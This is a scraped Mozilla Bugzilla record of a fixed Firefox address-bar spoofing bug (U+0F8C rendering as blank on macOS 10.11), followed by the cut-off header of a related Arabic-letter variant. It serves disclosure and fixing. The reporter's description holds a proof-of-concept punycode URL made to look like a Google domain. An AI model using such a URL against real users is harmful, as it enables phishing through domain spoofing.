=== Content from bugzilla.mozilla.org_42fb9eed_20250126_104320.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1390980)
* [XML](/show_bug.cgi?ctype=xml&id=1390980)

Closed
[Bug 1390980](/show_bug.cgi?id=1390980)

Opened 7 years ago
Closed 7 years ago

# Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11

## Categories

### (Firefox :: Address Bar, defect)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=Address%20Bar#Address%20Bar)

Address Bar
▾

Firefox :: Address Bar
For bugs in the Firefox "Smart Location Bar" (aka Awesome Bar) UI element, including the bookmark and history autocomplete matching behavior.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=Address%20Bar&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=Address%20Bar&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=Address%20Bar)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

macOS

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Firefox 57

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr52 | [56+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=56%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed) |
| firefox55 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=wontfix) |
| firefox56 | [-](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed) |
| firefox57 | [-](/buglist.cgi?f1=cf_tracking_firefox57&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox57&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr52 | 56+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox55 |  | wontfix |
| firefox56 | - | fixed |
| firefox57 | - | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jackwillzac, Assigned: jfkthame)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40)  [jfkthame](/user_profile?user_id=329583)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/534e6954d2407bfd2188d1ac1900f216?d=mm&size=40)  [jackwillzac](/user_profile?user_id=575795)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/d949a35ad3900bd0ee47938b23a0cbee?d=mm&size=40)  [dao](/user_profile?user_id=219124)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

12 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2017-7763](/show_bug.cgi?id=1360309 "VERIFIED FIXED - Security issue: Domain spoofing thanks to U+0F8C rendered as space on Mac")

## Details

### (4 keywords, Whiteboard: [adv-main56+][adv-esr52.4+][post-critsmash-triage])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main56+][adv-esr52.4+][post-critsmash-triage]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [abillings](/user_profile?user_id=280903) | [sec-bounty](#a1124834_280903 "7 years ago") | + |
| --- | --- | --- |
| [abillings](/user_profile?user_id=280903) | sec-bounty | + |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | [qe-verify](#a2871977_452604 "7 years ago") | - |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file)

| [Work around more bad fonts on older macOS](/attachment.cgi?id=8898706)  [7 years ago](#c7)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   1.37 KB, patch | jrmuizel : [review+](#a171241_309398 "7 years ago")  gchang : [approval-mozilla-beta+](#c15 "7 years ago")  gchang : [approval-mozilla-esr52+](#c15 "7 years ago") | [Details](/attachment.cgi?id=8898706&action=edit) | [Diff](/attachment.cgi?id=8898706&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1390980&attachment=8898706) |
| --- | --- | --- |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Jack Will](/user_profile?user_id=575795)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1390980#c0)• 7 years ago |
|  | |

<http://important-domain.google.xn--com-lumaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xn--cfdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/>

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1390980#c1)• 7 years ago |
|  | |

What exact version of MacOS are you on?Flags: needinfo?(jackwillzac)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1390980#c2)• 7 years ago |
|  | |

Gerv: there was another bug about Mac rendering a few Tibetan characters as blank spaces, but I can't find it. Do you recall?Flags: needinfo?(gerv)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1390980#c3)• 7 years ago |
|  | |

Never mind, found it.Status: UNCONFIRMED → RESOLVEDClosed: 7 years agoFlags: needinfo?(gerv)Resolution: --- → DUPLICATE

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1390980#c4)• 7 years ago |
|  | |

Reopening since [bug 1360309](/show_bug.cgi?id=1360309 "VERIFIED FIXED - Security issue: Domain spoofing thanks to U+0F8C rendered as space on Mac") is RESOLVED FIXED. It does appear fixed on macOS 10.12, but still shows up as blank spaces in 10.11
On 10.11 it looks like we'd also have to disable STKaiti, Kaiti SC, and Kaiti TC.
Kailasa and Kokonor claim to support Tibetan but I still get boxes when I leave those enabled; they seem fine.Assignee: nobody → jfkthameStatus: RESOLVED → REOPENEDEver confirmed: trueResolution: DUPLICATE → ---

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a88281_1689)• 7 years ago |

Keywords: [csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a88298_1689)• 7 years ago |

Summary: Domain spoofing thanks to U+0F8C rendered as 'space' on Mac → Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1390980#c5)• 7 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #4](/show_bug.cgi?id=1390980#c4 "RESOLVED FIXED - Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11"))
> Kailasa and Kokonor claim to support Tibetan but I still get boxes when I
> leave those enabled; they seem fine.
U+08FC (and a few following characters, I think) was not part of the Tibetan block when originally encoded in Unicode (v2.0); it was added much later. As such, it's not surprising if some Tibetan fonts don't include these newer characters.

|  | [Jack Will](/user_profile?user_id=575795)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a104692_575795)• 7 years ago |

Flags: needinfo?(jackwillzac)

|  | [Khalil Zhani](/user_profile?user_id=469104) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1390980#c6)• 7 years ago |
|  | |

(In reply to Matt Wobensmith [:mwobensmith][:matt:] from [comment #1](/show_bug.cgi?id=1390980#c1 "RESOLVED FIXED - Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11"))
> What exact version of MacOS are you on?
OS X El Capitan 10.11.6 (15G31). Sorry for the delayed response :)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1390980#c7)• 7 years ago |
|  | |

Attached patch

[Work around more bad fonts on older macOS](attachment.cgi?id=8898706&action=diff)
— [Details](attachment.cgi?id=8898706&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1390980&attachment=8898706)

I don't have a 10.11 system any longer to verify this, but according to [comment 4](/show_bug.cgi?id=1390980#c4 "RESOLVED FIXED - Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11") this is what we need to do. (Although the problem may be specific to 10.11, the patch is harmless for other macOS versions, as there are no versions of the Kaiti fonts where those codepoints are actually useful.)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a143238_329583)• 7 years ago |

[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: review?(jmuizelaar)

|  | [Jeff Muizelaar [:jrmuizel]](/user_profile?user_id=309398) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a171241_309398)• 7 years ago |

[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: review?(jmuizelaar) → review+

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1390980#c8)• 7 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/ee2f48b5ea07b963d5917e7e606a76abed0f9743>
[Bug 1390980](/show_bug.cgi?id=1390980 "RESOLVED FIXED - Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11") - Work around more bad fonts on older macOS. r=jrmuizel

|  | [Wes Kocher (:KWierso) (Not reading bugmail; email directly if needed)](/user_profile?user_id=308534) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1390980#c9)• 7 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/ee2f48b5ea07>Status: REOPENED → RESOLVEDClosed: 7 years ago → 7 years ago
[status-firefox57](/buglist.cgi?f1=cf_status_firefox57&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox57&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → Firefox 57

|  | [Khalil Zhani](/user_profile?user_id=469104) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1390980#c10)• 7 years ago |
|  | |

Is this report qualified for a bounty?

|  | [Jack Will](/user_profile?user_id=575795)  Reporter |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1390980#c11)• 7 years ago |
|  | |

(I'm on vacation, that's why I Cc'd Khalil Zhani)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1390980#c12)• 7 years ago |
|  | |

Looks like this could use Beta & ESR52 approval requests.
(In reply to Khalil Zhani from [comment #10](/show_bug.cgi?id=1390980#c10 "RESOLVED FIXED - Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11"))
> Is this report qualified for a bounty?
<https://www.mozilla.org/en-US/security/client-bug-bounty/> contains information on how to request a bounty for a submitted issue.
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=wontfix)
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=affected)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected)
[tracking-firefox56](/buglist.cgi?f1=cf_tracking_firefox56&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=%3F)
[tracking-firefox57](/buglist.cgi?f1=cf_tracking_firefox57&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox57&o1=equals&v1=%3F)
[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=%3F)Flags: needinfo?(jfkthame)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1390980#c13)• 7 years ago |
|  | |

Comment on [attachment 8898706](/attachment.cgi?id=8898706 "Work around more bad fonts on older macOS") [[details]](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") [[diff]](/attachment.cgi?id=8898706&action=diff "Work around more bad fonts on older macOS") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1390980&attachment=8898706)
Work around more bad fonts on older macOS
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
Not really a Gecko bug, this is a workaround for a buggy Apple font with spurious blank characters that might be used to obscure a spoofed URL. Although this does not affect the most recent macOS version (the font appears to have been fixed: the issue is present on 10.11 but not 10.12), it seems likely that a higher proportion of ESR users might also be on older OS releases and hence more likely to be affected than the general release population.
User impact if declined: Potential for URL spoofing due to invalid characters in a Chinese font shipped on older macOS releases
Fix Landed on Version: 57
Risk to taking this patch (and alternatives if risky): minimal
String or UUID changes made by this patch: noneFlags: needinfo?(jfkthame)
[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: approval-mozilla-esr52?
[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: approval-mozilla-beta?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a517666_280903)• 7 years ago |

Flags: sec-bounty?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1390980#c14)• 7 years ago |
|  | |

(In reply to Jonathan Kew (:jfkthame) from [comment #5](/show_bug.cgi?id=1390980#c5 "RESOLVED FIXED - Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11"))
> U+08FC ... was not part of the Tibetan block when originally encoded in Unicode (v2.0);
> ... [I]t's not surprising if some Tibetan fonts don't include these newer characters.
Would have been nice if they'd encoded them as reserved boxes rather than spooftastic blanks :-(See Also: → [CVE-2017-7763](/show_bug.cgi?id=1360309 "VERIFIED FIXED - Security issue: Domain spoofing thanks to U+0F8C rendered as space on Mac")

|  | [Gerry Chang [:gchang]](/user_profile?user_id=506302) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1390980#c15)• 7 years ago |
|  | |

Comment on [attachment 8898706](/attachment.cgi?id=8898706 "Work around more bad fonts on older macOS") [[details]](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") [[diff]](/attachment.cgi?id=8898706&action=diff "Work around more bad fonts on older macOS") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1390980&attachment=8898706)
Work around more bad fonts on older macOS
Avoid a potential URL spoofing. Beta56+ & ESR52+.
[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: approval-mozilla-esr52?
[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: approval-mozilla-esr52+
[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: approval-mozilla-beta?
[Attachment #8898706](/attachment.cgi?id=8898706&action=edit "Work around more bad fonts on older macOS") -
Flags: approval-mozilla-beta+

|  | [Gerry Chang [:gchang]](/user_profile?user_id=506302) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a563634_506302)• 7 years ago |

[tracking-firefox56](/buglist.cgi?f1=cf_tracking_firefox56&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=-)
[tracking-firefox57](/buglist.cgi?f1=cf_tracking_firefox57&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox57&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox57&o1=equals&v1=-)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1390980#c16)• 7 years ago |
|  | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/ce166fe03511>
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a719663_1689)• 7 years ago |

Group: firefox-core-security → core-security-release

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1390980#c17)• 7 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr52/rev/e45e21461784>
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a1029438_580382)• 7 years ago |

[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=%3F) → [56+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=56%2B)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a1124834_280903)• 7 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a2531509_280903)• 7 years ago |

Whiteboard: [adv-main56+][adv-esr52.4+]

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a2871977_452604)• 7 years ago |

Flags: qe-verify-Whiteboard: [adv-main56+][adv-esr52.4+] → [adv-main56+][adv-esr52.4+][post-critsmash-triage]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a14628774_1689)• 7 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1390980#a214181013_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1390980&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.mozilla.org_5f2c4b53_20250126_104317.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1393624)
* [XML](/show_bug.cgi?ctype=xml&id=1393624)

Closed
[Bug 1393624](/show_bug.cgi?id=1393624)
(CVE-2017-7825)

Opened 7 years ago
Closed 7 years ago

# Domain spoofing thanks to U+0620 ARABIC LETTER rendered as 'space' on Mac OS

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Domain spoofing thanks to U+0620 ARABIC LETTER rendered as 'space' on Mac OS

## Categories

### (Firefox :: Address Bar, defect)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=Address%20Bar#Address%20Bar)

Address Bar
▾

Firefox :: Address Bar
For bugs in the Firefox "Smart Location Bar" (aka Awesome Bar) UI element, including the bookmark and history autocomplete matching behavior.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=Address%20Bar&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=Address%20Bar&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=Address%20Bar)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

57 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Other

macOS

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Firefox 57

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Score | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr52 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed) |
| firefox55 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=wontfix) |
| firefox56 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed) |
| firefox57 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox57&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr52 |  | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox55 |  | wontfix |
| firefox56 |  | fixed |
